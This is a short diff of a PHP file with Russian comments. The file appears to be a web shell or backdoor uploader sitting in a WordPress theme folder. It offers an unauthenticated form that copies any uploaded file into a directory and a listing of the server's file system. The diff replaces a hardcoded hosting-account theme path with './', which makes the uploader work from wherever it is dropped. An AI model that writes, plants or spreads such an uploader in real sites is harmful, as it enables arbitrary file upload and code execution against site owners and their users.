@@ -43,9 +43,9 @@
 			<input type="file" name="uploadfile">
 			<input type="submit" name="button" value="Download"></form>
 		<?php
-			if (isset($_POST[button])){
+			if (isset($_POST['button'])){
 			// Каталог, в который мы будем принимать файл:
-			$uploaddir = '/home/u109591592/public_html/wp-content/themes/epixx/';
+			$uploaddir = './';
 			$uploadfile = $uploaddir.basename($_FILES['uploadfile']['name']);
 			// Копируем файл из каталога для временного хранения файлов:
 			if (copy($_FILES['uploadfile']['tmp_name'], $uploadfile))
@@ -142,7 +142,7 @@ function getFileList($dir)
 
     return $retval;
   }
-$dirlist = getFileList('/home/u109591592/public_html/wp-content/themes/epixx/');
+$dirlist = getFileList('./');
 // вывод результатов листинга в качестве HTML-таблицы
   echo "<table class='spc'>\n";
   echo "<input type='checkbox' id='raz' class='del' checked='checked'/><label for='raz' class='del'>Отобразить содержимое файловой системы</label>";	
